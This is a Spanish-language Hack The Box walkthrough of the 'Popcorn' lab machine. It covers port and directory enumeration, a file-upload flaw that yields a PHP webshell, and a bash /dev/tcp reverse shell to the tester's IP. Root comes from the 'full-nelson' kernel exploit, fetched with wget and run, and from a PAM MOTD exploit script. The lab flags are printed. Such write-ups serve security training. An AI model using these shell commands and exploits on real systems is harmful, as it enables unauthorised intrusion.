---
layout: single
title: Popcorn - Hack The Box 
excerpt: "La máquina Popcorn en Hack The Box representa un desafío de dificultad media. El análisis comienza con la identificación de una vulnerabilidad en el servicio de Torrent host, que permite una carga de imagen de screenshot comprometedora. A través de esta vía, se logra la ejecución de código PHP para obtener una webshell, lo que abre la puerta a una posible explotación más profunda del sistema objetivo. La creación de una reverseshell permite el control desde la máquina atacante, resaltando la importancia de una segmentación adecuada de la red y la protección contra amenazas externas.La fase de escalada de privilegios revela un sistema operativo desactualizado, un hallazgo crítico que puede ser aprovechado con una Proof Of Concept (PoC). Este descubrimiento pone de manifiesto la necesidad de implementar políticas de parcheo y actualización en entornos corporativos, destacando las graves implicaciones de mantener sistemas sin actualizar."
date: 2023-09-29
classes: wide
header:
  teaser: /assets/images/htb-writeup-popcorn/popcorn_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - web
  - vulnerability assesment
tags:
  - Arbitrary File Upload 
---
![](/assets/images/htb-writeup-popcorn/popcorn_logo.png)


La máquina "Popcorn" en Hack The Box representa un desafío de dificultad media.El análisis comienza con la identificación de una vulnerabilidad en el servicio de Torrent host, que permite una carga de imagen de screenshot comprometedora. A través de esta vía, se logra la ejecución de código PHP para obtener una webshell, lo que abre la puerta a una posible explotación más profunda del sistema objetivo. La creación de una reverseshell permite el control desde la máquina atacante, resaltando la importancia de una segmentación adecuada de la red y la protección contra amenazas externas.La fase de escalada de privilegios revela un sistema operativo desactualizado, un hallazgo crítico que puede ser aprovechado con una Proof Of Concept (PoC). Este descubrimiento pone de manifiesto la necesidad de implementar políticas de parcheo y actualización en entornos corporativos, destacando las graves implicaciones de mantener sistemas sin actualizar.

## <span style="color: yellow;">Enumeration</span>

#### <span style="color: gray;">Nmap</span>
```
┌─[ot3ro@parrot]─[~/HTB/Popcorn]
└──╼ $sudo nmap -sT 10.10.10.6 -Pn -n -v --reason -oN nmap-sT-popcorn

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

```
```
┌─[ot3ro@parrot]─[~/HTB/Popcorn]
└──╼ $sudo nmap -sVC 10.10.10.6 -p80,22 -Pn -n -vv -oN nmap-svc-popcorn 

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 5.1p1 Debian 6ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 3ec81b15211550ec6e63bcc56b807b38 (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAIAn8zzHM1eVS/OaLgV6dgOKaT+kyvjU0pMUqZJ3AgvyOrxHa2m+ydNk8cixF9lP3Z8gLwquTxJDuNJ05xnz9/DzZClqfNfiqrZRACYXsquSAab512kkl+X6CexJYcDVK4qyuXRSEgp4OFY956Aa3CCL7TfZxn+N57WrsBoTEb9PAAAAFQDMosEYukWOzwL00PlxxLC+lBadWQAAAIAhp9/JSROW1jeMX4hCS6Q/M8D1UJYyat9aXoHKg8612mSo/OH8Ht9ULA2vrt06lxoC3O8/1pVD8oztKdJgfQlWW5fLujQajJ+nGVrwGvCRkNjcI0Sfu5zKow+mOG4irtAmAXwPoO5IQJmP0WOgkr+3x8nWazHymoQlCUPBMlDPvgAAAIBmZAfIvcEQmRo8Ef1RaM8vW6FHXFtKFKFWkSJ42XTl3opaSsLaJrgvpimA+wc4bZbrFc4YGsPc+kZbvXN3iPUvQqEldak3yUZRRL3hkF3g3iWjmkpMG/fxNgyJhyDy5tkNRthJWWZoSzxS7sJyPCn6HzYvZ+lKxPNODL+TROLkmQ==
|   2048 aa1f7921b842f48a38bdb805ef1a074d (RSA)
|_ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAyBXr3xI9cjrxMH2+DB7lZ6ctfgrek3xenkLLv2vJhQQpQ2ZfBrvkXLsSjQHHwgEbNyNUL+M1OmPFaUPTKiPVP9co0DEzq0RAC+/T4shxnYmxtACC0hqRVQ1HpE4AVjSagfFAmqUvyvSdbGvOeX7WC00SZWPgavL6pVq0qdRm3H22zIVw/Ty9SKxXGmN0qOBq6Lqs2FG8A14fJS9F8GcN9Q7CVGuSIO+UUH53KDOI+vzZqrFbvfz5dwClD19ybduWo95sdUUq/ECtoZ3zuFb6ROI5JJGNWFb6NqfTxAM43+ffZfY28AjB1QntYkezb1Bs04k8FYxb5H7JwhWewoe8xQ==
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.2.12 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.2.12 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Nmap muestra dos servicios abiertos.

#### <span style="color: gray;">Dirb</span>
```
┌─[✗]─[ot3ro@parrot]─[~/HTB/Popcorn]
└──╼ $gobuster dir -u http://10.10.10.6/ -w /usr/share/wordlists/dirb/common.txt 

/.htaccess            (Status: 403) [Size: 287]
/.hta                 (Status: 403) [Size: 282]
/.htpasswd            (Status: 403) [Size: 287]
/.bash_history        (Status: 200) [Size: 4472]
/cgi-bin/             (Status: 403) [Size: 286] 
/index                (Status: 200) [Size: 177] 
/index.html           (Status: 200) [Size: 177] 
/test                 (Status: 200) [Size: 47032]
/torrent              (Status: 301) [Size: 310] [--> http://10.10.10.6/torrent/]
```
El escaneo con Dirb, muestra un directorio llamado 'torrent', al parecer es un CMS de compartición de archivos torrent.

![](/assets/images/htb-writeup-popcorn/torrent.png)

Podemos registrarnos para navegar en la apicación.

![](/assets/images/htb-writeup-popcorn/register.png)

![](/assets/images/htb-writeup-popcorn/welcome.png)

```
┌─[ot3ro@parrot]─[~/HTB/Popcorn]
└──╼ $gobuster dir -u http://10.10.10.6/torrent -w /usr/share/wordlists/dirb/common.txt 

/admin                (Status: 301) [Size: 316] [--> http://10.10.10.6/torrent/admin/]
/browse               (Status: 200) [Size: 9278]                                      
/comment              (Status: 200) [Size: 936]                                       
/config               (Status: 200) [Size: 0]                                         
/css                  (Status: 301) [Size: 314] [--> http://10.10.10.6/torrent/css/]  
/database             (Status: 301) [Size: 319] [--> http://10.10.10.6/torrent/database/]
/download             (Status: 200) [Size: 0]                                            
/edit                 (Status: 200) [Size: 0]                                            
/health               (Status: 301) [Size: 317] [--> http://10.10.10.6/torrent/health/]  
/hide                 (Status: 200) [Size: 3765]                                         
/images               (Status: 301) [Size: 317] [--> http://10.10.10.6/torrent/images/]  
/index                (Status: 200) [Size: 11356]                                        
/index.php            (Status: 200) [Size: 11356]                                        
/js                   (Status: 301) [Size: 313] [--> http://10.10.10.6/torrent/js/]      
/lib                  (Status: 301) [Size: 314] [--> http://10.10.10.6/torrent/lib/]     
/login                (Status: 200) [Size: 8367]                                         
/logout               (Status: 200) [Size: 182]                                          
/preview              (Status: 200) [Size: 28104]                                        
/readme               (Status: 301) [Size: 317] [--> http://10.10.10.6/torrent/readme/]  
/rss                  (Status: 200) [Size: 1724]                                         
/secure               (Status: 200) [Size: 4]                                            
/stylesheet           (Status: 200) [Size: 321]                                          
/templates            (Status: 301) [Size: 320] [--> http://10.10.10.6/torrent/templates/]
/thumbnail            (Status: 200) [Size: 1789]                                          
/torrents             (Status: 301) [Size: 319] [--> http://10.10.10.6/torrent/torrents/] 
/upload               (Status: 301) [Size: 317] [--> http://10.10.10.6/torrent/upload/]   
/upload_file          (Status: 200) [Size: 0]                                             
/users
```

## <span style="color: yellow;">Exploitation</span>

Al revisar el sitio del Torrent Host, podemos cargar un recurso torrent en el apartado 'upload'. Una vez que nuestro recurso se ha cargado, vemos una funcionalidad de carga de screenshots en la página de edición.

![](/assets/images/htb-writeup-popcorn/torrent_uploaded.png)

![](/assets/images/htb-writeup-popcorn/editthistorrent.png)

![](/assets/images/htb-writeup-popcorn/upload_screenshot.png)

En el directorio 'upload' que encontramos anteriormente, se guardan nuestras imagenes cargadas en un hash de formato hexadecimal.

![](/assets/images/htb-writeup-popcorn/hal.png)

Luego de capturar la petición POST de la carga de la imagen con Burpsuite, puedo modificar el contenido de bytes de la imagen con código php y cambiar la extensión del archivo a php, para intentar ejecutar código en el server, también cambiaré el nombre del id para identificar la carga.

![](/assets/images/htb-writeup-popcorn/capture_image.png)

![](/assets/images/htb-writeup-popcorn/hostname_script.png)

![](/assets/images/htb-writeup-popcorn/response_hostname_script.png)


Y en efecto conseguimos la ejecución de código. Vemos que el servidor nos responde con el hostname de la máquina víctima.

![](/assets/images/htb-writeup-popcorn/hostname_script_link.png)

![](/assets/images/htb-writeup-popcorn/hostname_script_response.png)

al parecer el filtro de carga de la aplicación es muy débil, aunque la aplicación puede identificar el tipo de archivo esperado y su extensión, no evalúa el contenido interno de los archivos para verificar su integridad o seguridad.




Podemos crear una payload de webshell php y cargarlo en el server como en el ejemplo anterior.
Antes de ejecutar la revershell, nos ponemos en escucha en 'nc'.

![](/assets/images/htb-writeup-popcorn/cmd_script_response.png)

![](/assets/images/htb-writeup-popcorn/cmd_script_id.png)

Ahora podemos obtener una shell ejecutando el comando "bash -c sh -i >& /dev/tcp/10.10.14.4/443 0>&1"

><p style="font-size: 16px;"> NOTA: es importante codificar la revershell para que el server no nos de problemas con la interpretación de los caracteres especiales </p>



![](/assets/images/htb-writeup-popcorn/revershell_request.png)


```
┌─[ot3ro@parrot]─[~/HTB/Popcorn]
└──╼ $sudo nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.10.6] 56887
sh: can't access tty; job control turned off
$ whoami
www-data
$ pwd
/var/www/torrent/upload
```
><p style="font-size: 16px;">tip: trata de conseguir una shell interactiva para moverte con más fluidez.</p>

```
www-data@popcorn:/$ cd /home/george/
www-data@popcorn:/home/george$ ls
torrenthoster.zip  user.txt
www-data@popcorn:/home/george$ cat user.txt 
611ba0ca8f6ed965a761b5070b8c494e

```
## <span style="color: yellow;">Privilege escalation</span>

```
www-data@popcorn:/home/george$ uname -a
Linux popcorn 2.6.31-14-generic-pae #48-Ubuntu SMP Fri Oct 16 15:22:42 UTC 2009 i686 GNU/Linux
www-data@popcorn:/home/george$ lsb_release -a
No LSB modules are available.
Distributor ID:	Ubuntu
Description:	Ubuntu 9.10
Release:	9.10
Codename:	karmic
www-data@popcorn:/home/george$ cd .cache/
www-data@popcorn:/home/george/.cache$ ls -al
total 8
drwxr-xr-x 2 george george 4096 Mar 17  2017 .
drwxr-xr-x 3 george george 4096 Oct 26  2020 ..
-rw-r--r-- 1 george george    0 Mar 17  2017 motd.legal-displayed
```
La versión de Ubuntu es muy antigüa y por lo tanto vulnerable.
><p style="font-size: 16px;">Ubuntu 9.10, también conocida como "Karmic Koala", fue lanzada originalmente en octubre de 2009. Esta versión de Ubuntu ya no recibe soporte oficial y no se recomienda su uso debido a posibles vulnerabilidades de seguridad y falta de actualizaciones.</p>

Uno de los POCs que nos puede ayudar a explotar esta vulnerabilidad se llama "full-nelson", lo puedes descargar en: [https://github.com/lucyoa/kernel-exploits/blob/master/full-nelson/full-nelson](https://github.com/lucyoa/kernel-exploits/blob/master/full-nelson/full-nelson)

```
┌─[ot3ro@parrot]─[~/HTB/Popcorn]
└──╼ $sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```
www-data@popcorn:/var/www/torrent/upload$ cd /tmp/
www-data@popcorn:/tmp$ wget 'http://10.10.14.4/full-nelson' -O 'nelson'

--2023-09-30 07:10:34--  http://10.10.14.4/full-nelson
Connecting to 10.10.14.4:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 584182 (570K) [application/octet-stream]
Saving to: `nelson'

...[SNIP]...

2023-09-30 07:10:35 (379 KB/s) - `nelson' saved [584182/584182]
```
```
www-data@popcorn:/tmp$ chmod +x nelson 
www-data@popcorn:/tmp$ ./nelson 
[*] Resolving kernel addresses...
 [+] Resolved econet_ioctl to 0xf8416280
 [+] Resolved econet_ops to 0xf8416360
 [+] Resolved commit_creds to 0xc01645d0
 [+] Resolved prepare_kernel_cred to 0xc01647d0
[*] Calculating target...
[*] Failed to set Econet address.
[*] Triggering payload...
[*] Got root!
# whoami
root
# id
uid=0(root) gid=0(root)
# cd /root 	
# ls
root.txt
# cat root.txt
679b73c93f73722b584867eb90cdb9af
# 
```

Por otro lado está el archivo 'motd.legal-displayed' en el directorio '.cache' del usuario george.
><p style="font-size: 16px;">El archivo motd.legal-displayed (Message of the Day Legal Displayed) es un archivo que se encuentra en algunos sistemas Unix y Linux. Su propósito principal es mostrar mensajes legales o acuerdos de usuario al iniciar sesión en un sistema.</p>

Descripción:

El módulo pam_motd (también conocido como el módulo MOTD) en libpam-modules antes de la versión 1.1.0-2ubuntu1.1 en PAM en Ubuntu 9.10 y libpam-modules antes de la versión 1.1.1-2ubuntu5 en PAM en Ubuntu 10.04 LTS permite a usuarios locales cambiar la propiedad de archivos arbitrarios mediante un ataque de enlace simbólico en .cache en el directorio de inicio de un usuario, relacionado con "marcas de tiempo de archivos de usuario" y el archivo motd.legal-notice

puedes encontrar un POC "Ubuntu PAM MOTD local root" en: [https://www.exploit-db.com/exploits/14273](https://www.exploit-db.com/exploits/14273) para explotar la vulnerabilidad del módulo pam_motd.

```
root@popcorn:/tmp# chmod +x Ubuntu_PAM_MOTD_local_root.sh 
root@popcorn:/tmp# ./Ubuntu_PAM_MOTD_local_root.sh 
[*] Ubuntu PAM MOTD local root
[*] SSH key set up
[*] Backuped /root/.cache
[*] spawn ssh
[+] owned: /etc/passwd
[*] spawn ssh
[+] owned: /etc/shadow
[*] Restored /root/.cache
[*] SSH key removed
[+] Success! Use password toor to get root
root@popcorn:/tmp# whoami
root
root@popcorn:/tmp# cat /root/root.txt 
2b51b2d3f72b728c77940552893a73eb
root@popcorn:/tmp# 
```
Y también logramos conseguir la escalada de privilegios.
